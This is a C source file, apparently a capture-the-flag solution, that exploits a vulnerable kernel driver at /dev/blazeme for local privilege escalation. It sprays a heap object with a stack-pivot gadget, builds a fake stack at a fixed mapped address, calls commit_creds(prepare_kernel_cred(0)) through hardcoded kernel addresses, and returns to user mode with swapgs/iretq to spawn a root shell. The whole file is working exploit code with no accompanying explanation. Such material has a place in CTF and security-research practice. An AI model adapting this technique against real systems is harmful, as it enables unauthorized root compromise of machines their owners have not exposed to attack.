#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

// compile line : gcc -static -o ./solve ./solve.c

struct TrapFrame{
	unsigned long rip;
	unsigned long cs;
	unsigned long rflags;
	unsigned long rsp;
	unsigned long ss;

}__attribute((packed));

struct TrapFrame tf;

#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff81063960;
void *(*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff81063b50;

static void shell(void){

	char* argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

static void save_state(void){
	asm volatile(
			"movq %%cs, %0\n"
			"movq %%ss, %1\n"
			"pushfq\n"
			"popq %2\n"
			: "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.rflags)
			:
			:"memory");


}

static void restore_state(void){

	asm volatile(
			"swapgs;"
			"movq %0, 0x20(%%rsp)\n"
			"movq %1, 0x18(%%rsp)\n"
			"movq %2, 0x10(%%rsp)\n"
			"movq %3, 0x8(%%rsp)\n"
			"movq %4, 0x0(%%rsp)\n"
			"iretq"
			:
			:"r"(tf.ss), "r"((unsigned long)0x1740000), "r"(tf.rflags), "r"(tf.cs), "r"(shell)
			:"memory"			
			);

			
}


static void priv_shell(void){
	commit_creds(prepare_kernel_cred(0));
	restore_state();
}




void main(){
	//gadgets.
	unsigned long pivot =  0xffffffff8109c604ull;  // mov esp, 0x1740000; ret; (1 found)                                                                                                   
	save_state();

	unsigned long* my_stack = mmap((void *)0x1730000, 0x1000000, PROT_READ|PROT_WRITE|PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
	
	printf("MMAP returned this : %p\n", my_stack);

	my_stack += 0x10000 / sizeof(unsigned long);
	*(my_stack) = (unsigned long)priv_shell;

	unsigned long pivot_array[8]; // Spray the heap with the pivot gadget.
	
	char payload[64];
	
	for(int i=0; i<8; i++)
		pivot_array[i] = pivot;

	strncpy(payload, "MA", 2);
	strncpy(payload+2, (const char *)pivot_array, 62);

	int fd = open("/dev/blazeme", O_RDWR);

	for(;;){
		write(fd, payload, 64);
	}

}
